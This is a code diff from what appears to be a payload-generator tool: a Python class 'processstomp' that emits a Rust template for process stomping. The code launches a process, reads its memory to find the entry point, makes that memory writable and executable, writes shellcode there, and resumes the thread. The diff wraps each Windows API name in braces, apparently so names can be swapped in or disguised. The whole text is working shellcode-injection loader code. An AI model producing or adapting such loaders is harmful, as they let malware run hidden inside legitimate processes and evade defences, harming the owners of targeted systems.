@@ -48,7 +48,7 @@ class processstomp:
         let mut lpprocessinformation = PROCESS_INFORMATION::default();
 
 
-        let _ = CreateProcessA(
+        let _ = {CreateProcessA}(
             ptr::null_mut(),
             name.as_ptr() as *mut u8, 
             ptr::null_mut(), 
@@ -65,7 +65,7 @@ class processstomp:
 
         let mut return_length: u32 = 0;
 
-        let _err = NtQueryInformationProcess(
+        let _err = {NtQueryInformationProcess}(
             (lpprocessinformation).hProcess, 
             0, 
             processinformation, 
@@ -80,7 +80,7 @@ class processstomp:
         let buffer: [u8; 8] = [0; 8];
         let lpbuffer: *mut c_void = std::mem::transmute(&buffer);
 
-        let _ = ReadProcessMemory(
+        let _ = {ReadProcessMemory}(
             (lpprocessinformation).hProcess, 
             lpbaseaddress, 
             lpbuffer, 
@@ -94,7 +94,7 @@ class processstomp:
         let buffer: [u8; 300] = [0; 300]; // Con 200 bytes no es suficiente
         let lpbuffer: *mut c_void = std::mem::transmute(&buffer);
         
-        let _ = ReadProcessMemory(
+        let _ = {ReadProcessMemory}(
             (lpprocessinformation).hProcess, 
             lpbaseaddress, 
             lpbuffer, 
@@ -111,14 +111,14 @@ class processstomp:
         let lpbuffer: *mut c_void = std::mem::transmute(shellcode.as_ptr());
         let lpfloldprotect: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());
 
-        let _ = VirtualProtectEx(
+        let _ = {VirtualProtectEx}(
             (lpprocessinformation).hProcess, 
             lpbaseaddress, 
             shellcode.len() as usize, 
             PAGE_EXECUTE_READWRITE, 
             lpfloldprotect);
 
-        let _ = WriteProcessMemory(
+        let _ = {WriteProcessMemory}(
             (lpprocessinformation).hProcess, 
             lpbaseaddress, 
             lpbuffer, 
@@ -128,13 +128,13 @@ class processstomp:
         
         let tmp: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());
 
-        let _ = VirtualProtectEx(
+        let _ = {VirtualProtectEx}(
             (lpprocessinformation).hProcess, 
             lpbaseaddress, 
             shellcode.len() as usize, 
             *lpfloldprotect, 
             tmp);
         
-        ResumeThread((lpprocessinformation).hThread);
+        {ResumeThread}((lpprocessinformation).hThread);
     }}
 """).substitute(target=self.target)
